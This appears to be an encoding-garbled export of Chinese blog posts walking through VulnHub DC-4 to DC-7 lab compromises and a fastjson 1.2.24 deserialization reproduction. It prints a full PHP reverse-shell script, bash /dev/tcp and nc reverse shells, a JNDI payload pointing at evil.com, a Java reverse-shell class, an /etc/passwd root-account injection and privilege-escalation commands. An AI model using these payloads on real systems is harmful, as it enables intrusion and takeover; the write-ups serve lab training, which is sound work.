ä¿¡æ¯æ”¶é›†\nnmapæ‰«æé¶æœº\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151951342.png)\n\nè®¿é—®é¦–é¡µ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151950632.png)\n\ncmsä¸ºDrupal8,æœä¸€ä¸‹cmsæ¼æ´,å°è¯•å‡ ä¸ªexpä½†ä¸å­˜åœ¨\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152016201.png)\n\næ‰«æä¸€ä¸‹ç›®å½•,éƒ½æ˜¯403,æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152017923.png)\n\nç›®å…‰æ¥åˆ°é¦–é¡µ,å‘ç°ä¸€ä¸ªid\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152019276.png)\n\ngoogleåœ¨githubä¸Šæ‰¾åˆ°æºç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206152020088.png)\n\nåœ¨é…ç½®æ–‡ä»¶ç¿»åˆ°æ•°æ®åº“è´¦å·å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206152023471.png)\n\n# Exploit\næ‹¿åˆ°æ•°æ®åº“è´¦å·å¯†ç ,ä½†æ˜¯nmapæ‰«æçš„æ—¶å€™,mysqlå¹¶æ²¡æœ‰å¼€å¯å¤–é“¾\n```\n$username = \"dc7user\";\n$password = \"MdR3xOgB7#dW\";\n```\n\n## æ’åº“\næ‹¿ç€è´¦å·å¯†ç æ’ä¸€ä¸‹ç™»å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152029676.png)\n\nå†è¯•ä¸€ä¸‹ssh,æˆåŠŸç™»å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152031261.png)\n\n\n## ææƒ\nç¿»çœ‹å®¶ç›®å½•ä¸‹çš„mboxæ–‡ä»¶æ‰¾åˆ°æ•æ„Ÿæ–‡ä»¶ backups.sh\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152042388.png)\n\nå‘ç°æ²¡æœ‰æƒé™\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152044362.png)\n\nçœ‹ä¸€ä¸‹rootæƒé™çš„å‘½ä»¤\n```bash\nfind / -user root -perm -4000\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152047725.png)\n\nå‡ ä¹éƒ½æ²¡æœ‰æƒé™,ä¹Ÿæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹,ä½†æ˜¯è¿™ä¸ªæ¡†æ¶æœ‰ä¸€ä¸ªDrushå‘½ä»¤\nDrushæ˜¯Drupalçš„å‘½ä»¤è¡Œshellå’ŒUnixè„šæœ¬æ¥å£ã€‚Drush Coreé™„å¸¦äº†è®¸å¤šæœ‰ç”¨çš„å‘½ä»¤ï¼Œå¯ç”¨äºä¸æ¨¡å—/ä¸»é¢˜/é…ç½®æ–‡ä»¶ç­‰ä»£ç è¿›è¡Œäº¤äº’ã€‚\n\nä¿®æ”¹adminå¯†ç ,ä¸Šç½‘ç«™åå°çœ‹çœ‹\n```bash\ndrush user-password admin --password=\"123\"\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152059358.png)\n\n## åå¼¹shell\næ²¡æœ‰ä¸Šä¼ ç¯å¢ƒ,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å®‰è£…æ’ä»¶,æ²¡æœ‰ç¯å¢ƒæˆ‘ä»¬è‡ªå·±åˆ›é€ ç¯å¢ƒ\nå®‰è£…æœ¬åœ°æ’ä»¶,ä¸‹è½½åœ°å€\n```\nhttps://www.drupal.org/project/php\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152122907.png)\n\nå¯ç”¨\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152119436.png)\n\nå†™webshell\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152123387.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152131986.png)\n```php\n\n  <?php\n  // php-reverse-shell - A Reverse Shell implementation in PHP\n  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\n  set_time_limit (0);\n  $VERSION = \"1.0\";\n  $ip = '172.16.17.140';  // You have changed this\n  $port = 4444;  // And this\n  $chunk_size = 1400;\n  $write_a = null;\n  $error_a = null;\n  $shell = 'uname -a; w; id; /bin/sh -i';\n  $daemon = 0;\n  $debug = 0;\n\n  //\n  // Daemonise ourself if possible to avoid zombies later\n  //\n\n  // pcntl_fork is hardly ever available, but will allow us to daemonise\n  // our php process and avoid zombies.  Worth a try...\n  if (function_exists('pcntl_fork')) {\n    // Fork and have the parent process exit\n    $pid = pcntl_fork();\n    \n    if ($pid == -1) {\n      printit(\"ERROR: Can't fork\");\n      exit(1);\n    }\n    \n    if ($pid) {\n      exit(0);  // Parent exits\n    }\n\n    // Make the current process a session leader\n    // Will only succeed if we forked\n    if (posix_setsid() == -1) {\n      printit(\"Error: Can't setsid()\");\n      exit(1);\n    }\n\n    $daemon = 1;\n  } else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n  }\n\n  // Change to a safe directory\n  chdir(\"/\");\n\n  // Remove any umask we inherited\n  umask(0);\n\n  //\n  // Do the reverse shell...\n  //\n\n  // Open reverse connection\n  $sock = fsockopen($ip, $port, $errno, $errstr, 30);\n  if (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n  }\n\n  // Spawn shell process\n  $descriptorspec = array(\n    0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n    1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n    2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n  );\n\n  $process = proc_open($shell, $descriptorspec, $pipes);\n\n  if (!is_resource($process)) {\n    printit(\"ERROR: Can't spawn shell\");\n    exit(1);\n  }\n\n  // Set everything to non-blocking\n  // Reason: Occsionally reads will block, even though stream_select tells us they won't\n  stream_set_blocking($pipes[0], 0);\n  stream_set_blocking($pipes[1], 0);\n  stream_set_blocking($pipes[2], 0);\n  stream_set_blocking($sock, 0);\n\n  printit(\"Successfully opened reverse shell to $ip:$port\");\n\n  while (1) {\n    // Check for end of TCP connection\n    if (feof($sock)) {\n      printit(\"ERROR: Shell connection terminated\");\n      break;\n    }\n\n    // Check for end of STDOUT\n    if (feof($pipes[1])) {\n      printit(\"ERROR: Shell process terminated\");\n      break;\n    }\n\n    // Wait until a command is end down $sock, or some\n    // command output is available on STDOUT or STDERR\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    // If we can read from the TCP socket, send\n    // data to process's STDIN\n    if (in_array($sock, $read_a)) {\n      if ($debug) printit(\"SOCK READ\");\n      $input = fread($sock, $chunk_size);\n      if ($debug) printit(\"SOCK: $input\");\n      fwrite($pipes[0], $input);\n    }\n\n    // If we can read from the process's STDOUT\n    // send data down tcp connection\n    if (in_array($pipes[1], $read_a)) {\n      if ($debug) printit(\"STDOUT READ\");\n      $input = fread($pipes[1], $chunk_size);\n      if ($debug) printit(\"STDOUT: $input\");\n      fwrite($sock, $input);\n    }\n\n    // If we can read from the process's STDERR\n    // send data down tcp connection\n    if (in_array($pipes[2], $read_a)) {\n      if ($debug) printit(\"STDERR READ\");\n      $input = fread($pipes[2], $chunk_size);\n      if ($debug) printit(\"STDERR: $input\");\n      fwrite($sock, $input);\n    }\n  }\n\n  fclose($sock);\n  fclose($pipes[0]);\n  fclose($pipes[1]);\n  fclose($pipes[2]);\n  proc_close($process);\n\n  // Like print, but does nothing if we've daemonised ourself\n  // (I can't figure out how to redirect STDOUT like a proper daemon)\n  function printit ($string) {\n    if (!$daemon) {\n      print \"$string\n\";\n    }\n  }\n\n  ?> \n```\n\n\nncç›‘å¬åå¼¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152133693.png)\n\nåå¼¹ä¸€ä¸ªäº¤äº’å¼shell\n```bash\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n```\n\nå°†åå¼¹shellçš„å‘½ä»¤å†™å…¥æœ€å¼€å§‹çš„backups.sh\n```bash\nbash -c 'exec bash -i &>/dev/tcp/172.16.17.140/9999 <&1'\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152148432.png)\n\nç­‰è®¡åˆ’ä»»åŠ¡æ‰§è¡Œåå¼¹ä¸€ä¸ªshellå›æ¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206152148588.png)\n\n","tags":["vulnhub","Drupal"],"categories":["æ‰“é¶"]},{"title":"vlunhub-dc6æ‰“é¶","url":"/2022/06/15/vulnhub-dc6æ‰“é¶/","content":"# æ¼æ´ç¯å¢ƒ\nvulnhubé¡¹ç›® https://www.vulnhub.com/entry/dc-6,315/\né¶æœº:172.16.17.147\næ”»å‡»æœºkali:172.16.17.140\n\n\n# æè¿°\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151342073.png)\n\n# ä¿¡æ¯æ”¶é›†\nnmapæ‰«ä¸€ä¸‹é¶æœº\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151342099.png)\n\n\nè®¿é—®å‘ç°è¢«é‡å®šå‘\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151340350.png)\n\næ·»åŠ ä¸€ä¸ªdnsè§£æ,WordPress\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151355811.png)\n\n# Exploit\n## çˆ†ç ´è´¦å·\nä½¿ç”¨wpscanæš´åŠ›æ‰«å‡ºè´¦å·\n```bash\nwpscan --url  http://wordy -e u\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151425104.png)\næ ¹æ®ç»™å‡ºçš„çº¿ç´¢æ‹¿åˆ°å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206151432351.png)\n\nè¦æ³¨æ„çš„æ˜¯è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…,éœ€è¦å…ˆè§£å‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151437401.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151438388.png)\n\næ ¹æ®è´¦å·å¯†ç å»çˆ†ç ´\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151439811.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151445374.png)\nçˆ†ç ´å‡ºè´¦å·å¯†ç \nmark / helpdesk0\n\n\n## æ’ä»¶åˆ©ç”¨\nåå°å‘ç°ä¸€ä¸ªæ’ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151453588.png)\n\næ‰¾åˆ°åˆ©ç”¨\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151454374.png)\n\nä¿®æ”¹åˆ©ç”¨æ–‡ä»¶åå¼¹åœ°å€ä¸ºkaliçš„åœ°å€\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151704922.png)\n\n## ææƒ\nkaliç›‘å¬,ç„¶åæ‰“å¼€åˆ©ç”¨æ–‡ä»¶,åå¼¹ä¸€ä¸ªshellå›æ¥,å†ç”¨pythonèµ·ä¸€ä¸ªäº¤äº’å¼shell\n```bash\npython -c 'import pty;pty.spawn(\"/bin/bash\")' \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151706659.png)\n\nç¿»ç›®å½•æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹,ä¸€ä¸ªå¯ä»¥ç™»å½•çš„è´¦å·\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151724387.png)\n\nç™»å½•ä¸Šå»å,æŸ¥çœ‹sudoè¿è¡Œçš„å‘½ä»¤,æ‰¾åˆ°ä¸€ä¸ªè„šæœ¬\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151731225.png)\n\nå‘backups.shæ–‡ä»¶ä¸­å†™å…¥â€/bin/bashâ€ï¼Œå¹¶ä»¥jensç”¨æˆ·å»æ‰§è¡Œè¯¥è„šæœ¬\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151836816.png)\n\nç»§ç»­çœ‹suidå‘½ä»¤\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151839915.png)\n\nå­˜åœ¨nmap,å¯ä»¥ä½¿ç”¨nmapæ¥ææƒ\nnseæ˜¯nmapçš„æ’ä»¶æ‰©å±•å\n```bash\ncat os.execute('/bin/bash') > shell.nes\nsudo nmap --script=shell.nes\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151846689.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151846069.png)","tags":["vulnhub","WordPress"],"categories":["æ‰“é¶"]},{"title":"vulnhub-dc5æ‰“é¶","url":"/2022/06/14/vulnhub-dc5æ‰“é¶/","content":"# æ¼æ´ç¯å¢ƒ\nvulnhub https://www.vulnhub.com/entry/dc-5,314/\né¶æœº:172.16.17.146\næ”»å‡»æœºkali:172.16.17.140\n\n# æè¿°\n![](https://raw.githubusercontent.com/chencicici/images/main/202206141926926.png)\n\n# ä¿¡æ¯æ”¶é›†\nnmapæ‰«æé¶æœº\n![](https://raw.githubusercontent.com/chencicici/images/main/202206141959729.png)\n\nå¼€äº†111ç«¯å£rpcbind,ç™¾åº¦æ˜¯æ‹’ç»æœåŠ¡æ¼æ´,å¿½ç•¥\n\næ‰“å¼€ç½‘ç«™é¦–é¡µ,æ‰«ä¸€ä¸‹ç›®å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142002735.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142002568.png)\n\nå‘ç°ä¸€ä¸ªç•™è¨€æ¿,æäº¤çœ‹çœ‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142008726.png)\nå¤šæ¬¡æäº¤åå‘ç°,é¡µè„šåœ¨å˜åŒ–,ç»“åˆæ‰«ç›®å½•æ—¶å€™å‘ç°ä¸€ä¸ªfooter.php\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142009106.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142010169.png)\n\n\n# Exploit\nåº”è¯¥æ˜¯åŒ…å«äº†è¿™ä¸ªfooter.phpæ–‡ä»¶,å°è¯•æ–‡ä»¶åŒ…å«æ¼æ´,çŒœä¸€ä¸‹å‚æ•°å\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142013650.png)\n\nå°è¯•ä¼ªåè®®getshell,ä½†æ˜¯åº”è¯¥æ²¡æœ‰å¼€å¯allow_url_include,é»˜è®¤ä¸ºå…³é—­\n```bash\nhttp://127.0.0.1?file=php://input PostData:<?php phpinfo();?>\n```\n\n## å°è¯•è¯»å–åˆ«çš„ä¿¡æ¯\næƒé™å¾ˆä½,åªèƒ½è¯»å–ä¸€ä¸‹nginxçš„æ—¥å¿—,å› ä¸ºæ‰«è¿‡ç›®å½•æ‰€ä»¥ä¿¡æ¯å¾ˆå¤š,ç¿»åˆ°æœ€åå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¯»å–/etc/passwdçš„è¯·æ±‚\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142025366.png)\n\n## å†™webshell\næ€»ç»“ä¸€ä¸‹,ç°åœ¨æˆ‘ä»¬æœ‰æ–‡ä»¶åŒ…å«,èƒ½æŸ¥çœ‹nginxæ—¥å¿—\né‚£ä¹ˆæˆ‘æ˜¯å¦å¯ä»¥æ„é€ ä¸€å¥è¯è¯·æ±‚,è®©ä»–å†™å…¥æ—¥å¿—,å†åˆ©ç”¨æ–‡ä»¶åŒ…å«å»æ‰§è¡Œ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142210938.png)\n\nè¿™é‡Œæœ‰ä¸€ä¸ªå‘,è¯·æ±‚å‘é€ä¹‹å,å†å»æŸ¥çœ‹æ—¥å¿—,å´æ²¡æœ‰,å…¶å®å·²ç»å†™è¿›å»äº†\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142212468.png)\n\n## åå¼¹shell\nåå¼¹ä¸€ä¸ªshellåˆ°kali\n```bash\nbash -c 'exec bash -i &>/dev/tcp/172.16.17.140/4444 <&1'\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142214174.png)\n\nè¿™é‡Œåå¼¹å›æ¥çš„å°±æ˜¯ä¸€ä¸ªäº¤äº’å¼shell\n\n# ææƒ\n\n## suidææƒ\nç¿»äº†ç¿»ç›®å½•,æ²¡ä»€ä¹ˆä¸œè¥¿,çœ‹çœ‹ä»¥rootæƒé™è¿è¡Œçš„å‘½ä»¤\n```bash\nfind / -perm -4000 2>/dev/null\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142217377.png)\n\næœ‰ä¸€ä¸ªscreen\nScreenæ˜¯ä¸€æ¬¾ç”±GNUè®¡åˆ’å¼€å‘çš„ç”¨äºå‘½ä»¤è¡Œç»ˆç«¯åˆ‡æ¢çš„è‡ªç”±è½¯ä»¶ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥è½¯ä»¶åŒæ—¶è¿æ¥å¤šä¸ªæœ¬åœ°æˆ–è¿œç¨‹çš„å‘½ä»¤è¡Œä¼šè¯ï¼Œå¹¶åœ¨å…¶é—´è‡ªç”±åˆ‡æ¢ã€‚GNU Screenå¯ä»¥çœ‹ä½œæ˜¯çª—å£ç®¡ç†å™¨çš„å‘½ä»¤è¡Œç•Œé¢ç‰ˆæœ¬ã€‚å®ƒæä¾›äº†ç»Ÿä¸€çš„ç®¡ç†å¤šä¸ªä¼šè¯çš„ç•Œé¢å’Œç›¸åº”çš„åŠŸèƒ½ã€‚\n\nkaliæœç´¢ä¸€ä¸‹åˆ©ç”¨\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142235068.png)\n\nå°†expå¤åˆ¶å‡ºæ¥ç”¨èšå‰‘ç›´æ¥å†™åˆ°tmpç›®å½•ä¸‹\nåœ¨rootç›®å½•ä¸‹æ‹¿åˆ°flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206142236665.png)\n","tags":["æ–‡ä»¶åŒ…å«","vulnhub"],"categories":["æ‰“é¶"]},{"title":"vlunhub-dc4æ‰“é¶","url":"/2022/06/13/vulnhub-dc4æ‰“é¶/","content":"# ç¯å¢ƒ\nvulnhubé¡¹ç›® https://www.vulnhub.com/entry/dc-4,313/\né¶æœº:172.16.17.145\næ”»å‡»æœºkali:172.16.17.140\n\n# æè¿°\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131949872.png)\n\n# ä¿¡æ¯æ”¶é›†\nå¯¹é¶æœºè¿›è¡Œnmapæ‰«æ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131938943.png)\nå¼€æ”¾22å’Œ80ç«¯å£\n\næ‰“å¼€ç½‘ç«™é¦–é¡µæ˜¯ä¸€ä¸ªç™»å½•æ¡†\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131942760.png)\n\næ‰«æç›®å½•,æ²¡ä»€ä¹ˆæ”¶è·\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131938888.png)\n\nå›åˆ°ç™»å½•,æ²¡æœ‰éªŒè¯ç ä¹Ÿæ²¡æœ‰token,å°è¯•çˆ†ç ´\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131937353.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131937509.png)\n\n\n# Exploit\n## å‘½ä»¤æ‰§è¡Œ\nç™»å½•çœ‹åˆ°,commandæ•æ„Ÿå­—,ç»§ç»­è·Ÿè¿›\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131944821.png)\n\næ˜æ˜¾çš„å‘½ä»¤æ‰§è¡Œ,æŠ“åŒ…åˆ†æ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131945003.png)\n\næˆåŠŸæ‰§è¡Œå‘½ä»¤\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131947263.png)\n\n## åå¼¹shell\nåå¼¹ä¸€ä¸ªshellåˆ°kaliçœ‹çœ‹ ,ncç›‘å¬æœ¬åœ°4444ç«¯å£\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131949018.png)\n\nåå¼¹æˆåŠŸ\n```bash\nnc -e /bin/sh 172.16.17.140 4444\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131959946.png)\n\nåˆ©ç”¨pythonåå¼¹ä¸€ä¸ªäº¤äº’å¼shell\n```bash\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206132003636.png)\n\n## ææƒ\nç¿»ç¿»ç›®å½•,åœ¨å®¶ç›®å½•ç¿»åˆ°ä¸€äº›æ–‡ä»¶,å‘ç°ç–‘ä¼¼å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206132013881.png)\n\nå¤åˆ¶å‡ºæ¥æ„é€ è´¦å·ä¸ºå®¶ç›®å½•çš„å‡ ä¸ªæ–‡ä»¶å¤¹å,å¯†ç ä¸ºpasswords.bakæ–‡ä»¶é‡Œçš„\n![](https://raw.githubusercontent.com/chencicici/images/main/202206132019075.png)\n\nç”¨hydraçˆ†ç ´å‡ºè´¦å·å¯†ç   jim/jibril04\n![](https://raw.githubusercontent.com/chencicici/images/main/202206132030300.png)\n\nç™»å½•,ä¸€é¡¿ç¿»å‘ç°æœ‰é‚®ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202206132034541.png)\n\nåœ¨/var/spool/mailä¸‹ç¿»åˆ°é‚®ä»¶,æ‰¾åˆ°Charlesçš„å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206132035868.png)\n\nå°è¯•ç™»å½•,å‘ç°æ²¡æœ‰è¿™ä¸ªç”¨æˆ·\n![](https://raw.githubusercontent.com/chencicici/images/main/202206132036751.png)\nåˆ‡æ¢ä¸€ä¸‹å°å†™æˆåŠŸç™»å½•,æŸ¥çœ‹ä¸€ä¸‹sudo è¿è¡Œçš„å‘½ä»¤æœ‰ä¸€ä¸ªteehee\n![](https://raw.githubusercontent.com/chencicici/images/main/202206132043031.png)\n\nä½¿ç”¨teeheeå‘½ä»¤ææƒ\n```bash\n/usr/share/nginx/html$ echo \"ceshi::0:0:::/bin/bash\" | sudo teehee -a /etc/passwd\n```\n\nææƒåˆ° root\n![](https://raw.githubusercontent.com/chencicici/images/main/202206132046393.png)\n\næ‰¾åˆ°flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206132046070.png)\n\n\n\n\n\n","tags":["vulnhub","drupal7","ææƒ"],"categories":["æ‰“é¶"]},{"title":"fastjson1.2.24ååºåˆ—åŒ–æ¼æ´å¤ç°","url":"/2022/06/13/fastjson1-2-24ååºåˆ—åŒ–æ¼æ´å¤ç°/","content":"# æ¼æ´æ¦‚è¿°\nCVE-2017-18349\nfastjson åœ¨è§£æ json çš„è¿‡ç¨‹ä¸­ï¼Œæ”¯æŒä½¿ç”¨ autoType æ¥å®ä¾‹åŒ–æŸä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œå¹¶è°ƒç”¨è¯¥ç±»çš„ set/get æ–¹æ³•æ¥è®¿é—®å±æ€§ã€‚é€šè¿‡æŸ¥æ‰¾ä»£ç ä¸­ç›¸å…³çš„æ–¹æ³•ï¼Œå³å¯æ„é€ å‡ºä¸€äº›æ¶æ„åˆ©ç”¨é“¾ã€‚\næ ¹æ®å®˜æ–¹ç»™å‡ºçš„è¡¥ä¸æ–‡ä»¶ï¼Œä¸»è¦çš„æ›´æ–°åœ¨è¿™ä¸ª checkAutoType å‡½æ•°ä¸Šï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯æ·»åŠ äº†é»‘åå•ï¼Œå°†ä¸€äº›å¸¸ç”¨çš„ååºåˆ—åŒ–åˆ©ç”¨åº“éƒ½æ·»åŠ åˆ°é»‘åå•ä¸­ã€‚\n\n# å¤ç°ç¯å¢ƒ\nvulhubé¡¹ç›® https://vulhub.org/#/environments/fastjson/1.2.24-rce/\n\n\n# Exploit\nè®¿é—®\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131547498.png)\n\n\nå‘æœåŠ¡å™¨postä¸€ä¸ªjsonå¯¹è±¡,å³å¯æ›´æ–°æœåŠ¡ç«¯ä¿¡æ¯\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131555028.png)\n\n\n\nå› ä¸ºç›®æ ‡ç¯å¢ƒæ˜¯ Java 8u102ï¼Œæ²¡æœ‰ com.sun.jndi.rmi.object.trustURLCodebaseçš„é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ com.sun.rowset.JdbcRowSetImplçš„åˆ©ç”¨é“¾ï¼Œå€ŸåŠ© JNDI æ³¨å…¥æ¥æ‰§è¡Œå‘½ä»¤ã€‚\né¦–å…ˆç¼–è¯‘å¹¶ä¸Šä¼ å‘½ä»¤æ‰§è¡Œä»£ç ï¼Œå¦‚ http://x.x.x.x:8989/TouchFile.classï¼š\n```java\n// javac TouchFile.java\nimport java.lang.Runtime;\nimport java.lang.Process;\n\npublic class TouchFile {\n    static {\n        try {\n            Runtime rt = Runtime.getRuntime();\n            String[] commands = {\"bash\",\"-c\",\"touch\", \"/tmp/success\"};\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n        } catch (Exception e) {\n            // do nothing\n        }\n    }\n}\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131559623.png)\n\néœ€è¦æ³¨æ„çš„æ˜¯:\nString commands åœ¨éƒ¨åˆ†ç¯å¢ƒä¸‹éœ€è¦æ·»åŠ  bash -c ,å¦åˆ™æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚\nå¦‚æœæ²¡æœ‰ web æœåŠ¡ï¼Œå…¶å®å¯ä»¥é€šè¿‡ php -S 0.0.0.0: portæˆ–è€… python -m SimpleHTTPServer portä¸´æ—¶æ­å»ºä¸€ä¸ª web æœåŠ¡å™¨ï¼Œå…¶å‘å¸ƒç›®å½•å³å½“å‰æ‰§è¡Œç›®å½•ã€‚\n\n## æœ‰å¤–ç½‘VPS\nå€ŸåŠ©[marshalsecé¡¹ç›®](https://github.com/mbechler/marshalsec)å¯åŠ¨ä¸€ä¸ª RMI æœåŠ¡å™¨ï¼Œç›‘å¬ 9999 ç«¯å£ï¼Œå¹¶åˆ¶å®šåŠ è½½è¿œç¨‹ç±» TouchFile.class\nä¹Ÿå¯ä»¥ä½¿ç”¨æ‰“åŒ…å¥½çš„jaråŒ…[é¡¹ç›®åœ°å€](https://github.com/zhzyker/exphub/blob/master/fastjson/marshalsec-0.0.3-SNAPSHOT-all.jar)\n\nå°†ç”Ÿæˆçš„ marshalsec-0.0.3-SNAPSHOT-all.jaråŒ…éƒ¨ç½²åˆ°å…¬ç½‘çš„ä¸€å° VPS ä¸Šï¼Œæ‰§è¡Œå¦‚ä¸‹è„šæœ¬\n```bash\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://x.x.x.x:port/#TouchFile\" 9999\n```\n\nå‘é€å¦‚ä¸‹æ•°æ®åŒ…\n```\nPOST / HTTP/1.1\nHost: your-ip:8090\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/json\nContent-Length: 160\n\n{\n    \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"rmi://evil.com:9999/TouchFile\",\n        \"autoCommit\":true\n    }\n}\n```\n\n## æ— å¤–ç½‘VPS\n\n### å‘½ä»¤æ‰§è¡Œ\nä½¿ç”¨kaliå½“vpsä¸»æœº\n\nå…ˆæ„é€ æ¶æ„ä»£ç ,å¹¶ç¼–è¯‘\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131846179.png)\n\nå†ä½¿ç”¨pythonèµ·ä¸€ä¸ªhttpæœåŠ¡\n```bash\npython -m http.server 80  \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131847211.png)\n\næ¥ç€å¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œè®¾ç½®ç›‘å¬ç«¯å£ï¼Œå¹¶åˆ¶å®šåŠ è½½è¿œç¨‹ç±»TouchFile.class,ipä¸ºhttpæœåŠ¡çš„ip\n```bash\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://172.16.17.140:80/#TouchFile\" 9999\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131848263.png)\n\næ„é€ æ•°æ®åŒ…,å†™å…¥exp\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131849458.png)\n\nå‘½ä»¤æ‰§è¡ŒæˆåŠŸ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131850067.png)\n\n### åå¼¹shell\nåå¼¹shell,åªéœ€è¦ä¿®æ”¹TouchFile.javaæ–‡ä»¶ä¸­çš„command éƒ¨åˆ†å³å¯,å¹¶é‡æ–°ç¼–è¯‘,å‚è€ƒå¦‚ä¸‹:\n```java\n// javac shell_re.java\n import java.lang.Runtime;\n import java.lang.Process;\n public class shell_re {\n    static {\n        try {\n            Runtime rt = Runtime.getRuntime();\n            String[] commands = {\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/x.x.x.x/4444;cat <&5 | while read line; do $line 2>&5 >&5; done\"};\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n        } catch (Exception e) {\n            // do nothing\n        }\n    }\n }\n```\n\nnc 